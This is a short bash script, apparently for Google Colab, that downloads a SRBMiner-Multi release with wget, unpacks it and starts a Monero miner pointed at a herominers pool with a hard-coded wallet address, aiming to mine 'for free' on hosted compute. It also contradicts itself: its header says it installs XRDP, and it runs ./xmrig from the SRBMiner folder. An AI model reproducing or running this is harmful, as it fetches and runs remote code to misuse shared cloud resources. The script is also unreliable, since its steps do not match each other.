#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr


wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.4/SRBMiner-Multi-0-9-4-Linux.tar.xz
tar -xf SRBMiner-Multi-0-9-4-Linux.tar.xz
cd SRBMiner-Multi-0-9-4
./xmrig -o de.monero.herominers.com:1111 -a rx -k -u 438hdgmCogPSF85d7KZXTETtmodfUpQAm842oY9qymi8SfukFsFfuVEMXaGzzQE7SxN5CqKCCT8QabA9PEQeTJqpM11Dz5w.worker -p x
